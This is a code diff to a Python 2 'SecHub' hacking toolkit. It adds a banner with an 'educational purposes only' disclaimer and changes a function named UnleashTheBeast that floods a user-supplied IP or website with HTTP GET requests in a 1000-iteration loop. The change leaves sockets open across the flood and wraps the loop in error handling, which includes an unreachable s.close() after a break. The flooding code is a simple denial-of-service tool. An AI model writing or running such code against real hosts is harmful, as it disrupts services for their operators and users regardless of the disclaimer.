@@ -1,3 +1,25 @@
+'''
+						Welcome to SecHub.
+						------------------
+  SecHub is an Open Source Security Tool Kit developed for Pen-Testers,
+Hackers, and Security Reasearches. This tool was developed by Josh,
+(Yeh, just Josh).
+
+  This peice of Software is meant to be used for educational purposes only.
+SecHub is simply ethical and should be used simply good, not for bad. The Developer
+of this product is not to be held responsible for misuse of this tool.
+
+  Finally, SecHub is in it's early stages of development, so please report 
+any bugs to the gitHub Repository. Now go Hack The Planet!
+
+-SecHub Developer,
+
+Josh
+
+ 
+'''
+
+
 import os
 import sys
 import socket
@@ -183,12 +205,13 @@ def UnleashTheBeast():
 		cprint("\t[*] Flooding " + ip + " with " + troll_input + " Packets." , 'green')
 		s.send("\tGET /" + troll_input + " HTTP/1.1\r\n")
 		s.send("\tHOST: " + beast_input + "\r\n\r\n");
-		s.close()
+	
 		
 		
 		
 	except socket.error as msg:
-		print(str(msg))
+		print("\t" + str(msg))
+		s.close()
 
 	except KeyboardInterrupt:
 		cprint("\n\t[!] User Aborted Flooding!", 'red')
@@ -308,6 +331,7 @@ def main():
 	if start_script_input == '3':
 		global beast_input
 		global troll_input
+
 		os.system('clear')
 
 		beast_input = raw_input(colored("\t() Enter IP/Website To Flood: ", 'blue'))
@@ -322,7 +346,18 @@ def main():
 		time.sleep(1)
 
 		for x in range(1, 1000):
-			UnleashTheBeast()
+				try:
+					UnleashTheBeast()
+
+				except socket.error as n:
+					print("\t" + str(n))
+					break
+					s.close()
+
+				except KeyboardInterrupt:
+					cprint("\n[-] User Aborted! ", 'red')
+					sys.exit()
+
 				
 	if start_script_input == '4':
 		os.system('clear')
